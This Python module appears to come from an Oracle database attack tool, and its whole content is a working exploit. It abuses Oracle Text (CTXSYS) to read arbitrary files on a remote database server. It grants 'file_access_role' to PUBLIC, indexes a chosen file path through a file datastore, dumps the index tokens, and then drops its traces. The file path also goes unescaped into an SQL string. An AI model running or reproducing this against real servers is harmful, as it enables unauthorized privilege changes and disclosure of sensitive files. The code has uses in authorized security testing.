#!/usr/bin/python
# -*- coding: utf-8 -*-

from OracleDatabase import OracleDatabase
import logging,cx_Oracle
from Utils import ErrorSQLRequest, checkOptionsGivenByTheUser
from Constants import *

class Ctxsys (OracleDatabase):
	'''
	Allow to use CTXSYS remotly
	'''
	def __init__(self,args):
		'''
		Constructor
		'''
		logging.debug("Ctxsys object created")
		OracleDatabase.__init__(self,args)
		self.tableName = self.__generateRandomString__()
		self.indexName = self.__generateRandomString__()

	def __giveTheCxsysPriv__(self, user):
		'''
		Give the CTXSYS priv to the user with, for exemple:
		exec ctxsys.ctx_adm.set_parameter('file_access_role', 'public')
		'''
		logging.info('Try to give the file_access_role privilege to the current user')
		parameters = {'param_name':'file_access_role','param_value':user}
		cursor = cx_Oracle.Cursor(self.args['dbcon'])
		try :
			cursor.callproc(name="ctxsys.ctx_adm.set_parameter",keywordParameters=parameters)
		except Exception,e: 
			logging.info('Error with ctxsys.ctx_adm.set_parameter{0}'.format(self.cleanError(e)))
			return ErrorSQLRequest(e)
		return True

	def __createTable__(self):
		'''
		Create table name with, for exemple:
		CREATE TABLE rf1 (id NUMBER PRIMARY KEY, path VARCHAR(255) UNIQUE, ot_format VARCHAR(6));
		'''
		logging.info('Create the table: {0}'.format(self.tableName))
		query = "CREATE TABLE {0} (id NUMBER PRIMARY KEY, path VARCHAR(255) UNIQUE, ot_format VARCHAR(6))".format(self.tableName)
		response = self.__execThisQuery__(query=query,isquery=False)
		if isinstance(response,Exception) :
			logging.info('Error with the SQL request {0}: {1}'.format(query,str(response)))
			return response
		else : return True

	def __dropTable__(self):
		'''
		Drop the table with, for exemple
		DROP TABLE my_table PURGE; 
		'''
		logging.info('Drop the table: {0}'.format(self.tableName))
		query = "DROP TABLE {0} PURGE".format(self.tableName)
		response = self.__execThisQuery__(query=query,isquery=False)
		if isinstance(response,Exception) :
			logging.info('Error with the SQL request {0}: {1}'.format(query,str(response)))
			return response
		else : return True
		
	def __insertFileInTable__(self,fn):
		'''
		Insert into the table the file path with, for exemple:
		INSERT INTO rf1 VALUES (1, 'c:\temp.txt', NULL);		
		'''
		logging.info('Insert the following file path in the {0} table: {1}'.format(self.tableName,fn))
		query = "INSERT INTO {0} VALUES (1, '{1}', NULL)".format(self.tableName,fn)
		response = self.__execThisQuery__(query=query,isquery=False)
		if isinstance(response,Exception) :
			logging.info('Error with the SQL request {0}: {1}'.format(query,str(response)))
			return response
		else : return True

	def __createIndexToFile__(self):
		'''
		Create an index to the file
		CREATE INDEX fi1 ON rf1(path) INDEXTYPE IS ctxsys.context PARAMETERS ('datastore ctxsys.file_datastore format column ot_format');
		'''
		logging.info('Create an index named {0} to the file'.format(self.indexName))
		query = "CREATE INDEX {0} ON {1}(path) INDEXTYPE IS ctxsys.context PARAMETERS ('datastore ctxsys.file_datastore format column ot_format')".format(self.indexName,self.tableName)
		response = self.__execThisQuery__(query=query,isquery=False)
		if isinstance(response,Exception) :
			logging.info('Error with the SQL request {0}: {1}'.format(query,str(response)))
			return response
		else : return True

	def __dropIndexToFile__(self):
		'''
		Drop index to the file
		DROP INDEX myindex;
		'''
		logging.info('Drop the index named {0}'.format(self.indexName))
		query = "DROP INDEX {0}".format(self.indexName)
		response = self.__execThisQuery__(query=query,isquery=False)
		if isinstance(response,Exception) :
			logging.info('Error with the SQL request {0}: {1}'.format(query,str(response)))
			return response
		else : return True

	def __getDataFromIndex__(self):
		'''
		Get data stored in file from the index
		'''
		logging.info('Get data stored in the file from the {0} index'.format(self.indexName))
		query = "Select token_text from dr${0}$i".format(self.indexName)
		response = self.__execQuery__(query=query,ld=['token_text'])
		if isinstance(response,Exception) :
			logging.info('Error with the SQL request {0}: {1}'.format(query,str(response)))
			return response
		else :
			if response == []: return ''
			else:
				data = ''
				for e in response : data += str(e['token_text']) + '\n' 
				return data

	def readAFile (self,nameFile):
		'''
		read a file on the remote server
		'''
		logging.info('Read the {0} file'.format(nameFile))
		status = self.__giveTheCxsysPriv__('public')
		status = self.__createTable__()
		if isinstance(status,Exception) : return status
		status = self.__insertFileInTable__(nameFile)
		if isinstance(status,Exception) : return status
		status = self.__createIndexToFile__()
		if isinstance(status,Exception) : return status
		data = self.__getDataFromIndex__()
		if data == '' : logging.info("The file is empty or it doesn't exist")
		self.__dropIndexToFile__()
		self.__dropTable__()
		return data

	def testAll (self):
		'''
		Test all functions
		'''
		self.args['print'].subtitle("CTXSYS library ?")
		logging.info("Try to read a random file with CTXSYS library")
		nameFile = self.__generateRandomString__()
		response = self.readAFile(nameFile)
		if response == '':
			self.args['print'].goodNews("OK")
			return True
		else :
			logging.info('Not enough privileges: {0}'.format(str(response)))
			self.args['print'].badNews("KO")
			return False
			
def runCtxsysModule(args):
	'''
	Run the CTXSYS module
	'''
	status = True
	if checkOptionsGivenByTheUser(args,["test-module","getFile"]) == False : return EXIT_MISS_ARGUMENT
	ctxsys = Ctxsys(args)
	status = ctxsys.connection(stopIfError=True)
	if args['test-module'] == True :
		args['print'].title("Test if the DBMSScheduler library can be used")
		status = ctxsys.testAll()
	#Option 1: read file
	if args['getFile'] !=None :
		args['print'].title("Read the {0} file on the {1} server".format(args['getFile'],args['server']))
		data = ctxsys.readAFile(args['getFile'])
		if isinstance(data,Exception):
			args['print'].badNews("Impossible to read the {0} file: {1}".format(args['getFile'],data))
		else : 
			if data == '' : args['print'].goodNews("The {0} file is empty or it doesn't exist".format(args['getFile']))
			else : args['print'].goodNews("Data stored in the {0} file (escape char replace by '\\n'):\n{1}".format(args['getFile'],data))		


